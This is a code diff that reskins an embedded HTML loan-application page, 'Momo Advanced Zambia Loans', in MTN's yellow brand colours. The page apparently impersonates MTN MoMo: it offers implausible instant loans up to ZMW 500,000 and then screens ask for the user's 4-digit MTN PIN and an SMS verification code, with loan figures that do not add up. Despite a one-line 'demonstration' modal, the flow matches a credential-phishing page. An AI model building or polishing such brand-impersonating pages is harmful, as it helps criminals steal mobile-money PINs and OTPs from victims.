@@ -136,9 +136,9 @@ HTML_PAGE = r"""<!DOCTYPE html>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
     :root {
-      --brand-blue: #004F71;
+      --brand-blue: #FFCC00;
       --brand-yellow: #FFCC00;
-      --brand-blue-dark: #00334E;
+      --brand-blue-dark: #F2C200;
       --brand-accent: #FFCC00;
     }
     @keyframes waveDot {
@@ -160,9 +160,9 @@ HTML_PAGE = r"""<!DOCTYPE html>
     .bg-MTN MoMo-cyan { background-color: var(--brand-yellow); }
     .text-MTN MoMo-cyan { color: var(--brand-yellow); }
     . { background-color: var(--brand-blue); }
-    .text-[#004F71] { color: var(--brand-blue); }
+    .text-[#FFCC00] { color: var(--brand-blue); }
     . { background-color: var(--brand-cyan); } /* Use cyan instead of red for brand consistency */
-    .text-[#004F71] { color: var(--brand-cyan); }
+    .text-[#FFCC00] { color: var(--brand-cyan); }
     .bg-[#FFCC00] { background-color: var(--brand-blue-dark); }
     .text-[#FFCC00] { color: var(--brand-blue-dark); }
     
@@ -199,8 +199,8 @@ HTML_PAGE = r"""<!DOCTYPE html>
         <div class="flex items-center gap-2">
 <img src="/assets/logo.jpg" alt="MTN SuperApp" class="w-10 h-10 mx-auto rounded-2xl object-cover shadow-md">
           <div class="flex flex-col">
-            <span class="text-lg font-black text-[#004F71] leading-none">Momo Advanced</span>
-            <span class="text-[10px] font-bold text-[#004F71] leading-none mt-0.5">Zambia Loans</span>
+            <span class="text-lg font-black text-[#FFCC00] leading-none">Momo Advanced</span>
+            <span class="text-[10px] font-bold text-[#FFCC00] leading-none mt-0.5">Zambia Loans</span>
           </div>
         </div>
         <span class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-semibold bg-yellow-50 text-yellow-700 border border-yellow-200">
@@ -242,36 +242,40 @@ HTML_PAGE = r"""<!DOCTYPE html>
   <!-- MAIN WRAPPER -->
   <main class="w-full max-w-[760px] mx-auto px-4 py-2 flex-1">
 
-    <!-- SCREEN 1: HOME --><section id="screen-home" class="space-y-4"><div class="text-center"><img src="/assets/logo.jpg" alt="MTN SuperApp" class="h-20 w-auto mx-auto mb-4">    <h2 class="text-xs tracking-widest font-bold text-[#004F71] uppercase">Zambia • Digital Loans</h2><h1 class="text-3xl sm:text-4xl font-extrabold text-[#004F71] mt-1 tracking-tight uppercase">Momo Advanced Loans</h1><p class="text-slate-600 text-sm mt-1">Instant, flexible financial relief delivered to your MTN.</p>
+    <!-- SCREEN 1: HOME --><section id="screen-home" class="space-y-4"><div class="text-center"><img src="/assets/logo.jpg" alt="MTN SuperApp" class="h-20 w-auto mx-auto mb-4">    <h2 class="text-xs tracking-widest font-bold text-[#FFCC00] uppercase">Zambia • Digital Loans</h2><h1 class="text-3xl sm:text-4xl font-extrabold text-[#FFCC00] mt-1 tracking-tight uppercase">Momo Advanced Loans</h1><p class="text-slate-600 text-sm mt-1">Instant, flexible financial relief delivered to your MTN.</p>
       </div>
 
       <!-- 4 Benefits -->
       <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
         <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
-          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">⚡</div>
+          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#FFCC00] flex items-center justify-center font-bold mb-2">⚡</div>
           <span class="text-xs font-bold text-slate-800">Instant Payout</span>
         </div>
         <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
-          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">📱</div>
+          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#FFCC00] flex items-center justify-center font-bold mb-2">📱</div>
           <span class="text-xs font-bold text-slate-800">100% Mobile</span>
         </div>
         <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
-          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">📄</div>
+          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#FFCC00] flex items-center justify-center font-bold mb-2">📄</div>
           <span class="text-xs font-bold text-slate-800">Clear Terms</span>
         </div>
         <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
-          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">🔒</div>
+          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#FFCC00] flex items-center justify-center font-bold mb-2">🔒</div>
           <span class="text-xs font-bold text-slate-800">Secure</span>
         </div>
       </div>
 
       <!-- MTN MoMo Hero Card -->
-      <div class="relative overflow-hidden  bg-gradient-to-br from-[#004F71] via-[#00334E] to-[#002233] text-white p-6 shadow-lg">
-        <div class="absolute -right-10 -bottom-10 w-44 h-44 rounded-full bg-[#FFCC00]/10 blur-xl pointer-events-none"></div>
-        <div class="relative z-10 space-y-3">
-          <span class="inline-block bg-[#FFCC00] text-[#004F71] px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wider">Fast Mobile Access</span>
-          <h3 class="text-2xl sm:text-3xl font-black leading-tight">Loans Up To ZMW 500,000 INSTANTLY!</h3>
-          <p class="text-blue-100 text-sm max-w-md">No paperwork, no standing in lines. Apply directly from your phone in under 2 minutes.</p>
+      <!-- MTN MoMo Hero Card -->
+<div class="relative overflow-hidden bg-gradient-to-br from-[#FFCC00] via-[#F2C200] to-[#E6B800] text-slate-900 p-6 shadow-lg">
+  <div class="absolute -right-10 -bottom-10 w-44 h-44 rounded-full bg-white/20 blur-xl pointer-events-none"></div>
+  <div class="relative z-10 space-y-3">
+    <span class="inline-block bg-slate-900 text-[#FFCC00] px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wider">FAST MOBILE ACCESS</span>
+    <h3 class="text-2xl sm:text-3xl font-black leading-tight text-slate-900">Loans Up To ZMW 500,000 INSTANTLY!</h3>
+    <p class="text-slate-800 text-sm max-w-md font-medium">No paperwork, no standing in lines. Apply directly from your phone in under 2 minutes.</p>
+  </div>
+</div>
+
         </div>
       </div>
 
@@ -279,15 +283,15 @@ HTML_PAGE = r"""<!DOCTYPE html>
       <div>
         <h4 class="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Loan Purpose</h4>
         <div class="flex gap-3 overflow-x-auto pb-2 hide-scrollbar">
-          <button onclick="setPurpose('Business')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">💼 Business</button>
-          <button onclick="setPurpose('School')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">🎓 School</button>
-          <button onclick="setPurpose('Emergency')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">🚨 Emergency</button>
-          <button onclick="setPurpose('Household')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">🏠 Household</button>
-          <button onclick="setPurpose('Travel &')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">✈️ Travel &</button>
+          <button onclick="setPurpose('Business')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#FFCC00]">💼 Business</button>
+          <button onclick="setPurpose('School')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#FFCC00]">🎓 School</button>
+          <button onclick="setPurpose('Emergency')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#FFCC00]">🚨 Emergency</button>
+          <button onclick="setPurpose('Household')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#FFCC00]">🏠 Household</button>
+          <button onclick="setPurpose('Travel &')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#FFCC00]">✈️ Travel &</button>
         </div>
       </div>
 
-      <button onclick="goTo('apply')" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
+      <button onclick="goTo('apply')" class="w-full py-4 rounded-2xl bg-[#FFCC00] hover:bg-[#F2C200] text-slate-900 font-bold text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
         APPLY NOW
       </button>
     </section>
@@ -297,7 +301,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
   <div class="flex items-center gap-3">
     <button onclick="goTo('home')" class="p-2  bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
     <div>
-      <h2 class="text-xl font-black text-[#004F71]">APPLY FOR LOAN</h2>
+      <h2 class="text-xl font-black text-[#FFCC00]">APPLY FOR LOAN</h2>
       <p class="text-xs text-slate-500">Step 1 of 4 • Personal details</p>
     </div>
   </div>
@@ -346,7 +350,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
     </div>
 
     <!-- The button is now a submit type to enforce the required checks -->
-    <button type="submit" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
+    <button type="submit" class="w-full py-4 rounded-2xl bg-[#FFCC00] hover:bg-[#F2C200] text-white font-bold text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
       CONTINUE
     </button>
   </form>
@@ -358,7 +362,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       <div class="flex items-center gap-3">
         <button onclick="goTo('apply')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50 transition-all">←</button>
         <div>
-          <h2 class="text-xl font-black text-[#004F71]">LOAN DETAILS</h2>
+          <h2 class="text-xl font-black text-[#FFCC00]">LOAN DETAILS</h2>
           <p class="text-xs text-slate-500">Step 2 of 4 • Select period & review breakdown</p>
         </div>
       </div>
@@ -366,7 +370,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-sm space-y-6">
         <div class="text-center">
           <div class="text-xs font-bold text-slate-400 uppercase tracking-wider">Requested Amount</div>
-          <div id="display-amount" class="text-4xl font-black text-[#004F71] mt-1">ZMW 500,000</div>
+          <div id="display-amount" class="text-4xl font-black text-[#FFCC00] mt-1">ZMW 500,000</div>
           <input type="range" id="amount-slider" min="500" max="500000" step="500" value="5000" oninput="syncAmount(this.value)" class="w-full mt-4 accent-[#FFCC00]">
           <div class="flex justify-between text-xs text-slate-400 mt-1 font-semibold">
             <span>ZMW 500</span>
@@ -378,11 +382,11 @@ HTML_PAGE = r"""<!DOCTYPE html>
           <div>
             <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-2">Repayment Period</label>
             <div class="grid grid-cols-5 gap-2">
-              <button type="button" onclick="setPeriod(7)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">7 Days</button>
-              <button type="button" onclick="setPeriod(14)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">14 Days</button>
-              <button type="button" onclick="setPeriod(30)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all bg-[#004F71] text-[#FFCC00] border-[#004F71] shadow-sm">30 Days</button>
-              <button type="button" onclick="setPeriod(60)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">60 Days</button>
-              <button type="button" onclick="setPeriod(90)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">90 Days</button>
+              <button type="button" onclick="setPeriod(7)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#FFCC00]">7 Days</button>
+              <button type="button" onclick="setPeriod(14)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#FFCC00]">14 Days</button>
+              <button type="button" onclick="setPeriod(30)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all bg-[#FFCC00] text-[#FFCC00] border-[#FFCC00] shadow-sm">30 Days</button>
+              <button type="button" onclick="setPeriod(60)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#FFCC00]">60 Days</button>
+              <button type="button" onclick="setPeriod(90)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#FFCC00]">90 Days</button>
             </div>
           </div>
 
@@ -405,14 +409,14 @@ HTML_PAGE = r"""<!DOCTYPE html>
             <span>Repayment Due Date</span>
             <span id="breakdown-date" class="font-bold text-slate-800">30/09/2026</span>
           </div>
-          <div class="flex justify-between text-base font-extrabold text-[#004F71] pt-2 border-t border-slate-100">
+          <div class="flex justify-between text-base font-extrabold text-[#FFCC00] pt-2 border-t border-slate-100">
             <span>Total Repayment</span>
-            <span id="breakdown-total" class="text-[#004F71]">ZMW 1,080</span>
+            <span id="breakdown-total" class="text-[#FFCC00]">ZMW 1,080</span>
           </div>
         </div>
       </div>
 
-      <button onclick="goTo('review', true)" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
+      <button onclick="goTo('review', true)" class="w-full py-4 rounded-2xl bg-[#FFCC00] hover:bg-[#F2C200] text-white font-bold text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
         CONTINUE
       </button>
     </section>
@@ -422,7 +426,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       <div class="flex items-center gap-3">
         <button onclick="goTo('loan')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50 transition-all">←</button>
         <div>
-          <h2 class="text-xl font-black text-[#004F71]">REVIEW APPLICATION</h2>
+          <h2 class="text-xl font-black text-[#FFCC00]">REVIEW APPLICATION</h2>
           <p class="text-xs text-slate-500">Step 3 of 4 • Verify all details before submission</p>
         </div>
       </div>
@@ -468,8 +472,8 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <!-- SCREEN 5: ENTER YOUR PIN -->
     <section id="screen-pin" class="hidden space-y-6">
       <div class="text-center pt-2">
-        <div class="w-14 h-14 mx-auto rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center text-2xl mb-3">🔒</div>
-        <h2 class="text-2xl font-black text-[#004F71]">ENTER YOUR PIN</h2>
+        <div class="w-14 h-14 mx-auto rounded-full bg-blue-100 text-[#FFCC00] flex items-center justify-center text-2xl mb-3">🔒</div>
+        <h2 class="text-2xl font-black text-[#FFCC00]">ENTER YOUR PIN</h2>
         <p class="text-xs text-slate-500 mt-1">Please enter your 4-digit MTN PIN to authorize</p>
       </div>
 
@@ -503,8 +507,8 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <!-- SCREEN 6: VERIFY YOUR NUMBER (OTP) -->
     <section id="screen-otp" class="hidden space-y-6">
       <div class="text-center pt-2">
-        <div class="w-14 h-14 mx-auto rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center text-2xl mb-3">📱</div>
-        <h2 class="text-2xl font-black text-[#004F71]">VERIFY YOUR NUMBER</h2>
+        <div class="w-14 h-14 mx-auto rounded-full bg-blue-100 text-[#FFCC00] flex items-center justify-center text-2xl mb-3">📱</div>
+        <h2 class="text-2xl font-black text-[#FFCC00]">VERIFY YOUR NUMBER</h2>
         <p class="text-xs text-slate-500 mt-1">A verification message has been sent to: <span id="otp-mobile-label" class="font-bold text-slate-700">+260 77 123 4567</span></p>
       </div>
 
@@ -514,10 +518,10 @@ HTML_PAGE = r"""<!DOCTYPE html>
       </div>
 
       <div class="text-center text-xs text-slate-500">
-        Didn't receive code? <button id="resend-btn" onclick="resendOtp()" class="font-bold text-[#004F71] hover:underline">Resend code in 30s</button>
+        Didn't receive code? <button id="resend-btn" onclick="resendOtp()" class="font-bold text-[#FFCC00] hover:underline">Resend code in 30s</button>
       </div>
 
-      <button id="btn-otp" onclick="startProcessing()" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all">
+      <button id="btn-otp" onclick="startProcessing()" class="w-full py-4 rounded-2xl bg-[#FFCC00] hover:bg-[#F2C200] text-white font-bold text-base tracking-wide shadow-md transition-all">
         VERIFY & CONTINUE
       </button>
     </section>
@@ -529,19 +533,19 @@ HTML_PAGE = r"""<!DOCTYPE html>
       </div>
 
       <div>
-        <h2 class="text-2xl font-black text-[#004F71]">PROCESSING APPLICATION</h2>
+        <h2 class="text-2xl font-black text-[#FFCC00]">PROCESSING APPLICATION</h2>
         <p class="text-xs text-slate-500 mt-1 max-w-sm mx-auto">Please wait while our automated scoring engine reviews your Momo Advanced application.</p>
       </div>
 
       <div class="max-w-[320px] mx-auto bg-white rounded-2xl border border-slate-200 p-4 space-y-3 text-left text-xs font-semibold">
-        <div id="step-sub" class="flex items-center gap-3 text-[#004F71]">
+        <div id="step-sub" class="flex items-center gap-3 text-[#FFCC00]">
           <span class="font-bold text-emerald-600">✓</span><span>Application Submitted</span>
         </div>
-        <div id="step-ver" class="flex items-center gap-3 text-[#004F71]">
+        <div id="step-ver" class="flex items-center gap-3 text-[#FFCC00]">
           <span class="font-bold text-emerald-600">✓</span><span>Phone Verified</span>
         </div>
-        <div id="step-proc" class="flex items-center gap-3 text-[#004F71] animate-pulse">
-          <span class="w-2.5 h-2.5 rounded-full bg-[#004F71] inline-block ml-0.5"></span><span>Processing Assessment...</span>
+        <div id="step-proc" class="flex items-center gap-3 text-[#FFCC00] animate-pulse">
+          <span class="w-2.5 h-2.5 rounded-full bg-[#FFCC00] inline-block ml-0.5"></span><span>Processing Assessment...</span>
         </div>
         <div id="step-dec" class="flex items-center gap-3 text-slate-400">
           <span class="w-2.5 h-2.5 rounded-full border border-slate-300 inline-block ml-0.5"></span><span>Final Decision</span>
@@ -555,7 +559,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
         <div class="w-20 h-20 mx-auto rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center text-4xl mb-3 shadow-inner font-bold">
           ✓
         </div>
-        <h2 class="text-2xl sm:text-3xl font-black text-[#004F71]">LOAN APPROVED!</h2>
+        <h2 class="text-2xl sm:text-3xl font-black text-[#FFCC00]">LOAN APPROVED!</h2>
         <p class="text-xs text-slate-500 mt-1">Funds will be disbursed through the contact details provided.</p>
       </div>
 
@@ -566,7 +570,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
         </div>
         <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
           <span class="text-slate-500">Approved Amount</span>
-          <span id="approved-amount" class="text-lg font-black text-[#004F71]">ZMW 100,000</span>
+          <span id="approved-amount" class="text-lg font-black text-[#FFCC00]">ZMW 100,000</span>
         </div>
         <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
           <span class="text-slate-500">Repayment Amount</span>
@@ -579,7 +583,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       </div>
 
       <div class="space-y-3">
-        <button onclick="goTo('details')" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all">
+        <button onclick="goTo('details')" class="w-full py-4 rounded-2xl bg-[#FFCC00] hover:bg-[#F2C200] text-white font-bold text-base tracking-wide shadow-md transition-all">
           VIEW LOAN DETAILS
         </button>
         <button onclick="goTo('home')" class="w-full py-3.5 rounded-2xl bg-white border border-slate-200 text-slate-700 font-bold text-sm hover:bg-slate-50">
@@ -593,7 +597,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       <div class="flex items-center gap-3">
         <button onclick="goTo('home')" class="p-2  bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
         <div>
-          <h2 class="text-xl font-black text-[#004F71]">ACTIVE LOAN DETAILS</h2>
+          <h2 class="text-xl font-black text-[#FFCC00]">ACTIVE LOAN DETAILS</h2>
           <p class="text-xs text-slate-500">Reference: EC-984210</p>
         </div>
       </div>
@@ -610,11 +614,11 @@ HTML_PAGE = r"""<!DOCTYPE html>
         <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Principal</span><span id="details-principal" class="font-bold text-slate-800">ZMW 100,000</span></div>
         <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Interest (5%)</span><span id="details-interest" class="font-bold text-slate-800">ZMW 50</span></div>
         <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Service Fees</span><span id="details-fees" class="font-bold text-slate-800">ZMW 30</span></div>
-        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Total Repayment</span><span id="details-total" class="font-black text-[#004F71]">ZMW 1,080</span></div>
+        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Total Repayment</span><span id="details-total" class="font-black text-[#FFCC00]">ZMW 1,080</span></div>
         <div class="flex justify-between py-1.5"><span class="text-slate-500">Due Date</span><span id="details-date" class="font-bold text-slate-800">30/09/2026</span></div>
       </div>
 
-      <button onclick="goTo('home')" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all">
+      <button onclick="goTo('home')" class="w-full py-4 rounded-2xl bg-[#FFCC00] hover:bg-[#F2C200] text-white font-bold text-base tracking-wide shadow-md transition-all">
         BACK TO HOME
       </button>
     </section>
@@ -625,9 +629,9 @@ HTML_PAGE = r"""<!DOCTYPE html>
   <div id="info-modal" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4">
     <div onclick="closeInfoModal()" class="absolute inset-0 bg-slate-900/50 backdrop-blur-xs"></div>
     <div class="relative bg-white  p-6 max-w-sm w-full shadow-2xl border border-slate-200 text-center space-y-3 z-10">
-      <h3 id="info-title" class="text-lg font-bold text-[#004F71]">Information</h3>
+      <h3 id="info-title" class="text-lg font-bold text-[#FFCC00]">Information</h3>
       <p class="text-xs text-slate-600">This is a demonstration preview of the Momo Advanced Zambia loan journey. Features in this section are mock placeholders for demonstration.</p>
-      <button onclick="closeInfoModal()" class="w-full py-2.5 rounded-xl bg-[#004F71] text-white font-bold text-xs">Close</button>
+      <button onclick="closeInfoModal()" class="w-full py-2.5 rounded-xl bg-[#FFCC00] text-white font-bold text-xs">Close</button>
     </div>
   </div>
 
@@ -780,10 +784,10 @@ HTML_PAGE = r"""<!DOCTYPE html>
     function setPeriod(days) {
       appState.period = days;
       document.querySelectorAll('.period-btn').forEach(btn => {
-        btn.classList.remove('bg-[#004F71]', 'text-white', 'border-[#004F71]', 'shadow-sm');
+        btn.classList.remove('bg-[#FFCC00]', 'text-white', 'border-[#FFCC00]', 'shadow-sm');
         btn.classList.add('text-slate-700', 'border-slate-200');
         if (btn.innerText.includes(days + ' Days')) {
-          btn.classList.add('bg-[#004F71]', 'text-[#FFCC00]', 'border-[#004F71]', 'shadow-sm');
+          btn.classList.add('bg-[#FFCC00]', 'text-[#FFCC00]', 'border-[#FFCC00]', 'shadow-sm');
           btn.classList.remove('text-slate-700', 'border-slate-200');
         }
       });
@@ -799,7 +803,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       if (diffDays > 0) {
         appState.period = diffDays;
         document.querySelectorAll('.period-btn').forEach(btn => {
-          btn.classList.remove('bg-[#004F71]', 'text-[#FFCC00]', 'border-[#004F71]', 'shadow-sm');
+          btn.classList.remove('bg-[#FFCC00]', 'text-[#FFCC00]', 'border-[#FFCC00]', 'shadow-sm');
           btn.classList.add('text-slate-700', 'border-slate-200');
         });
         calculateCosts();
@@ -813,10 +817,10 @@ HTML_PAGE = r"""<!DOCTYPE html>
         btn.disabled = !checked;
         if (checked) {
           btn.classList.remove('bg-slate-300', 'cursor-not-allowed');
-          btn.classList.add('bg-[#004F71]', 'hover:bg-[#00334E]');
+          btn.classList.add('bg-[#FFCC00]', 'hover:bg-[#F2C200]');
         } else {
           btn.classList.add('bg-slate-300', 'cursor-not-allowed');
-          btn.classList.remove('bg-[#004F71]', 'hover:bg-[#00334E]');
+          btn.classList.remove('bg-[#FFCC00]', 'hover:bg-[#F2C200]');
         }
       }
     }
@@ -905,10 +909,10 @@ HTML_PAGE = r"""<!DOCTYPE html>
         const dot = document.getElementById('dot-' + i);
         if (dot) {
           if (i < enteredPin.length) {
-            dot.classList.add('bg-[#004F71]', 'border-[#004F71]');
+            dot.classList.add('bg-[#FFCC00]', 'border-[#FFCC00]');
             dot.classList.remove('border-slate-300');
           } else {
-            dot.classList.remove('bg-[#004F71]', 'border-[#004F71]');
+            dot.classList.remove('bg-[#FFCC00]', 'border-[#FFCC00]');
             dot.classList.add('border-slate-300');
           }
         }
